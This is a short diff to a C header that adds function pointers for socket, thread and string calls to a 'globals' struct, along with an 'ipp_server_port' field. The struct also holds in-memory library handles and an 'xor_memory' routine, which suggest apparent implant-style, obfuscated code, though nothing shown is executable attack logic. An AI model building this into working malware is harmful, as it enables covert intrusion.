@@ -37,14 +37,17 @@ typedef struct globals{
     int (*snprintf)(char *__s, size_t __maxlen, const char * __format, ...);
     int (*fprintf)(FILE *__restrict__ __stream, const char *__restrict__ __format, ...);
     int (*printf)(const char *__restrict__ __format, ...);
+    void (*perror)(const char *__s);
     char *(*strerror)(int __errnum);
     size_t (*strlen)(const char *__s);
     int (*strcmp)(const char *__s1, const char *__s2);
     char *(*strstr)(const char *__haystack, const char *__needle);
     char *(*strncpy)(char *__restrict__ __dest, const char *__restrict__ __src, size_t __n);
+    int (*sscanf)(const char *__restrict__ __s, const char *__restrict__ __format, ...);
 
     // memory
     void *(*memcpy)(void *__restrict__ __dest, const void *__restrict__ __src, size_t __n);
+    void *(*memset)(void *__s, int __c, size_t __n);
 
     // files
     char *(*realpath)(const char *restrict path, char *restrict resolved_path);
@@ -74,7 +77,9 @@ typedef struct globals{
     int (*accept)(int __fd, struct sockaddr *__restrict__ __addr, socklen_t *__restrict__ __addr_len);
     int (*getifaddrs)(struct ifaddrs **__ifap);
     void (*freeifaddrs)(struct ifaddrs *__ifa);
-
+    
+    ssize_t (*recv)(int __fd, void *__buf, size_t __n, int __flags);
+    ssize_t (*send)(int __fd, const void *__buf, size_t __n, int __flags);
     ssize_t (*recvfrom)(int __fd, void *__restrict__ __buf, size_t __n, int __flags, __SOCKADDR_ARG __addr, socklen_t *__restrict__ __addr_len);
     ssize_t (*sendto)(int __fd, const void *__buf, size_t __n, int __flags, __CONST_SOCKADDR_ARG __addr, socklen_t __addr_len);
 
@@ -83,6 +88,7 @@ typedef struct globals{
 
     // threads
     int (*pthread_create)(pthread_t *__restrict__ __newthread, const pthread_attr_t *__restrict__ __attr, void *(*__start_routine)(void *), void *__restrict__ __arg);
+    int (*pthread_detach)(pthread_t __th);
     void (*pthread_exit)(void *__retval);
     
     // fds
@@ -96,6 +102,7 @@ typedef struct globals{
     char * exec_path;
     void * lib_mem;
     MaLib * lib;
+    int ipp_server_port;
 
     // custom functions
     void (*xor_memory)(void * memory, size_t len, char*key);
